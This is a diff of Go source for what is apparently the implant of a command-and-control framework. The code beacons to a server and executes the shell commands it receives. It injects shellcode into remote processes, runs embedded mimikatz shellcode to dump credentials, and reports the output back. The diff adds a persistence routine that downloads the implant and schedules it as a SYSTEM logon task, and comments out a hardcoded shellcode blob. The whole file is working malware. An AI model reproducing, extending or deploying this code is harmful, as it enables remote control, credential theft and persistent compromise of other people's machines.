@@ -1,33 +1,34 @@
 package main
 
 import (
-	"os"
-	"fmt"
-	"time"
 	"bufio"
-	"os/exec"
-	"strings"
-	"strconv"
 	"context"
-	"runtime"
-	"os/user"
-	"net/http"
+	b64 "encoding/base64"
 	"encoding/hex"
 	"encoding/json"
-	b64 "encoding/base64"
+	"fmt"
+	"net/http"
+	"os"
+	"os/exec"
+	"os/user"
+	"runtime"
+	"strconv"
+	"strings"
+	"time"
+
 	ps "github.com/mitchellh/go-ps"
 	"github.com/thecodeteam/goodbye"
 )
 
 type Beacon struct {
-	Ip string
-	Id string
-	ProxyClients []string
-	ExecBuffer []string
-	DownloadBuffer []string
-	UploadBuffer []string
+	Ip              string
+	Id              string
+	ProxyClients    []string
+	ExecBuffer      []string
+	DownloadBuffer  []string
+	UploadBuffer    []string
 	ShellcodeBuffer []string
-	LastSeen time.Time 	
+	LastSeen        time.Time
 }
 
 var msPerUpdate int = 3000
@@ -36,6 +37,7 @@ var cmdProxyId string
 var cmdAddress string
 var cmdPort string
 var cmdHost string
+var webPort string
 var secret string
 var id string
 var ip string
@@ -56,7 +58,7 @@ var netClient = &http.Client{
 }
 
 func handleQueryResponse(encData []byte) {
-	data := encData//securityContext.decrypt(encData) // TODO : FIX THIS
+	data := encData //securityContext.decrypt(encData) // TODO : FIX THIS
 	var beaconMsgs []BeaconMessage
 	json.Unmarshal(data, &beaconMsgs)
 
@@ -87,11 +89,11 @@ func useCommResp(commResp CommandResponse, packet Request) {
 		procId := -1
 		shellcode := commResp.Shellcode[i]
 		procInfo := strings.Split(commResp.Shellcode[i+1], " ")
-		
+
 		if procInfo[0] != "module" {
 			procId, _ = strconv.Atoi(procInfo[1])
 		}
-		
+
 		decodedShellcode, err := b64.StdEncoding.DecodeString(shellcode)
 
 		if err != nil {
@@ -100,7 +102,7 @@ func useCommResp(commResp CommandResponse, packet Request) {
 		}
 
 		if procInfo[0] != "module" {
-			si := RemoteShellcodeInjector { decodedShellcode, procId }
+			si := RemoteShellcodeInjector{decodedShellcode, procId}
 			err := si.inject()
 			if err != nil {
 				output = err.Error()
@@ -108,12 +110,12 @@ func useCommResp(commResp CommandResponse, packet Request) {
 				output = ""
 			}
 		} else {
-			si := RemotePipedShellcodeInjector { decodedShellcode, strings.Join(procInfo[1:], " ") }
+			si := RemotePipedShellcodeInjector{decodedShellcode, strings.Join(procInfo[1:], " ")}
 			output = si.inject()
 		}
-		
+
 		var data []byte
-				
+
 		if procInfo[0] == "migrate" {
 			var msg string
 			if err == nil || err.Error() == "The operation completed successfully." {
@@ -123,17 +125,16 @@ func useCommResp(commResp CommandResponse, packet Request) {
 				msg = err.Error()
 			}
 
-			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"migrate",[]byte(msg)})
+			data, err = json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "migrate", []byte(msg)})
 		} else if procInfo[0] == "module" {
-			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(output)})
+			data, err = json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "inject", []byte(output)})
 		} else {
-			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(output)})
+			data, err = json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "inject", []byte(output)})
 		}
 
 		debugFatal(err)
-	 	encoded := b64.StdEncoding.EncodeToString(data)
+		encoded := b64.StdEncoding.EncodeToString(data)
 		queryCommandHttp(encoded)
-	
 	}
 
 	for _, file := range commResp.Download {
@@ -152,22 +153,25 @@ func useCommResp(commResp CommandResponse, packet Request) {
 	}
 
 	for _, cmd := range commResp.Exec {
-		cmdSplit := strings.Fields(cmd);
+		cmdSplit := strings.Fields(cmd)
 		output := []byte{}
-		
+
 		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
 			packet.exitHandler()
 		}
 
 		if cmdSplit[0] == "mimikatz" {
+			if platform != "windows" {
+				return
+			}
 			data, _ := hex.DecodeString(mimikatzShellcode)
-			injector := RemotePipedShellcodeInjector { 
+			injector := RemotePipedShellcodeInjector{
 				shellcode: data,
-				args: strings.Join(append(cmdSplit[0:], "exit"), " "),
+				args:      strings.Join(append(cmdSplit[0:], "exit"), " "),
 			}
 
 			out := injector.inject()
-			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"mimikatz",[]byte(out)})
+			data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "mimikatz", []byte(out)})
 			debugFatal(err)
 			encoded := b64.StdEncoding.EncodeToString(data)
 			queryCommandHttp(encoded)
@@ -177,64 +181,103 @@ func useCommResp(commResp CommandResponse, packet Request) {
 		if cmdSplit[0] == "plist" {
 			procs := "------------------------------\nPID\tPPID\tName\n------------------------------"
 			procList, _ := ps.Processes()
-			
+
 			for _, p := range procList {
 				procs += "\n" + strconv.Itoa(p.Pid()) + "\t" + strconv.Itoa(p.PPid()) + "\t" + p.Executable()
 			}
 
-			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"plist",[]byte(procs)})
+			data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "plist", []byte(procs)})
 			debugFatal(err)
 			encoded := b64.StdEncoding.EncodeToString(data)
 			queryCommandHttp(encoded)
 			return
 		}
-		
-		var cmdHandle *exec.Cmd
 
-		if runtime.GOOS == "linux" {
-			command := []string{ "-c", cmd }
-			cmdHandle = exec.Command("/bin/sh", command...)
-		} else if runtime.GOOS == "windows" {
-			command := []string { "-c", cmd }
-			cmdHandle = exec.Command("powershell", command...)
+		if cmdSplit[0] == "persist" {
+			var output string
+			choice, _ := strconv.Atoi(cmdSplit[1])
+
+			if platform == "windows" {
+				if choice&SCHTASK == 1 {
+					loc := beaconHttp.download(id + ".exe")
+					if loc != "" {
+						output = "schtasks /create /tn wsman /tr \"" + loc + "\" /sc onlogon /ru System"
+						output += "\n" + string(runShellCommand(output))
+					}
+				}
+				if choice&REGRUNKEY == 1 {
+
+				}
+				if choice&KERNELDRIVER == 1 {
+
+				}
+				if choice&BITSJOB == 1 {
+
+				}
+				if choice&NEWACCOUNT == 1 {
+
+				}
+			}
+
+			data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "exec", []byte(output)})
+			debugFatal(err)
+			encoded := b64.StdEncoding.EncodeToString(data)
+			queryCommandHttp(encoded)
+			return
 		}
 
-		stderr, err := cmdHandle.StderrPipe()
-		stdout, err := cmdHandle.StdoutPipe()
-		
-		if err = cmdHandle.Start(); err == nil {
-			scanner := bufio.NewScanner(stderr)
-			
-			if err != nil {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
+		output = runShellCommand(cmd)
 
-			for scanner.Scan() {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-
-			scanner = bufio.NewScanner(stdout)
-			
-			if err != nil {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-
-			for scanner.Scan() {
-				output = append(output, scanner.Text()...)
-				output = append(output, '\n')
-			}
-		}
-		
 		if len(output) > 0 {
-			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"exec",output})
+			data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "exec", output})
 			debugFatal(err)
 			encoded := b64.StdEncoding.EncodeToString(data)
 			queryCommandHttp(encoded)
 		}
 	}
+}
+
+func runShellCommand(cmd string) []byte {
+	var output []byte
+	var cmdHandle *exec.Cmd
+
+	if runtime.GOOS == "linux" {
+		command := []string{"-c", cmd}
+		cmdHandle = exec.Command("/bin/sh", command...)
+	} else if runtime.GOOS == "windows" {
+		command := []string{"/c", cmd}
+		cmdHandle = exec.Command("cmd.exe", command...)
+	}
+
+	stderr, err := cmdHandle.StderrPipe()
+	stdout, err := cmdHandle.StdoutPipe()
+
+	if err = cmdHandle.Start(); err == nil {
+		scanner := bufio.NewScanner(stderr)
+
+		if err != nil {
+			output = append(output, scanner.Text()...)
+			output = append(output, '\n')
+		}
+
+		for scanner.Scan() {
+			output = append(output, scanner.Text()...)
+			output = append(output, '\n')
+		}
+
+		scanner = bufio.NewScanner(stdout)
+
+		if err != nil {
+			output = append(output, scanner.Text()...)
+			output = append(output, '\n')
+		}
+
+		for scanner.Scan() {
+			output = append(output, scanner.Text()...)
+			output = append(output, '\n')
+		}
+	}
+	return output
 }
 
 func main() {
@@ -251,30 +294,29 @@ func main() {
 	fmt.Println(id + " " + platform + "/" + arch)
 	fmt.Println(pid + " : " + p.Executable())
 	fmt.Println(e)
-	
+
 	lhost, err := externalIP()
 	debugFatal(err)
 	ip = lhost
-	jsonData, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,p.Executable(),"",nil})
+	jsonData, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, p.Executable(), "", nil})
 	debugFatal(err)
 
+	//data, _ := hex.DecodeString("4831c94881e9c6ffffff488d05efffffff48bbba56e3141c6ba58248315827482df8ffffffe2f4461e60f0ec836582ba56a2455d3bf7d3ec1ed2c679232ed0da1e684604232ed09a1e68664c23aa35f01cae25d5239442166a82681e4785c37b9fee551daa476fe817b25c97398509f86aab15cce0250aba56e35c99abd1e5f25733449723bdc63116c35d1dbb46d4f2a92a55975f2dcabb80ae25d5239442161722dd112aa44382b696e55068e9a6b213dac569b3fdc63116c75d1dbbc3c3315aab50972bb9cbbb86a29f18e3ed836a17bb554435fcd8fb0ea24d5d31ed015676a246e38bfdc3e30cab9f0e82f27d45a9be5da21cd6b0e565d1141c2af3cb33b0ab95f0cba482ba1f6af155d7a782be849c141c6ae4d6f3df0758959ae438f621c513e3bee90b503ee2151c6bfcc3007f637f1c9470d2ea1bd2dd515a65ca4596ab9dde235a42f2df2255a681aa5d5aa9365c95accf92fb0eaf9dfe232c7bfbec7ab1680a5a57f2d727541e6ba5cb02358e701c6ba582ba17b3554c232c60ed01b4592dabcf8fe317b3f6e00d62c69e02e21554e6e1a6a290e37c54e243d4ea17b3554c2af5cb4596a24455946dcf3397af9ddd2a1ffb766965ebc9239450f2a9299f122a1f8a3d4b83ebc9d055371800a2aebafe181f4583ab97d8439984c65c63effc1ea039fd45917b766bfcc3338c1cc11c6ba582")
+	//si := RemoteShellcodeInjector{
+	//	data,
+	//	4732,
+	//}
+	//errsi := si.injectModuleStomp()
+	//fmt.Println(errsi)
 
-	data, _ := hex.DecodeString("4831c94881e9c6ffffff488d05efffffff48bbba56e3141c6ba58248315827482df8ffffffe2f4461e60f0ec836582ba56a2455d3bf7d3ec1ed2c679232ed0da1e684604232ed09a1e68664c23aa35f01cae25d5239442166a82681e4785c37b9fee551daa476fe817b25c97398509f86aab15cce0250aba56e35c99abd1e5f25733449723bdc63116c35d1dbb46d4f2a92a55975f2dcabb80ae25d5239442161722dd112aa44382b696e55068e9a6b213dac569b3fdc63116c75d1dbbc3c3315aab50972bb9cbbb86a29f18e3ed836a17bb554435fcd8fb0ea24d5d31ed015676a246e38bfdc3e30cab9f0e82f27d45a9be5da21cd6b0e565d1141c2af3cb33b0ab95f0cba482ba1f6af155d7a782be849c141c6ae4d6f3df0758959ae438f621c513e3bee90b503ee2151c6bfcc3007f637f1c9470d2ea1bd2dd515a65ca4596ab9dde235a42f2df2255a681aa5d5aa9365c95accf92fb0eaf9dfe232c7bfbec7ab1680a5a57f2d727541e6ba5cb02358e701c6ba582ba17b3554c232c60ed01b4592dabcf8fe317b3f6e00d62c69e02e21554e6e1a6a290e37c54e243d4ea17b3554c2af5cb4596a24455946dcf3397af9ddd2a1ffb766965ebc9239450f2a9299f122a1f8a3d4b83ebc9d055371800a2aebafe181f4583ab97d8439984c65c63effc1ea039fd45917b766bfcc3338c1cc11c6ba582")
-	si := RemoteShellcodeInjector { 
-		data,
-		4732,
-	}
-	errsi := si.injectModuleStomp()
-	fmt.Println(errsi)
-	
 	if cmdProxyIp == "" {
-		var encoder = Base64Encoder {
+		var encoder = Base64Encoder{
 			data: jsonData,
 		}
-		
-		beaconHttp = &BeaconHttp {
+
+		beaconHttp = &BeaconHttp{
 			method: "GET",
-			data: encoder.scramble(),
+			data:   encoder.scramble(),
 		}
 
 		ctx := context.Background()
@@ -289,12 +331,12 @@ func main() {
 				beaconHttp.queryServer()
 			}()
 		}
- 	} else {
-		var encoder = Base64Encoder {
+	} else {
+		var encoder = Base64Encoder{
 			data: securityContext.encrypt(jsonData),
 		}
-		
-		handler := BeaconSmbServer { data: encoder.scramble(), initialized: false }
+
+		handler := BeaconSmbServer{data: encoder.scramble(), initialized: false}
 		handler.start()
 	}
 }
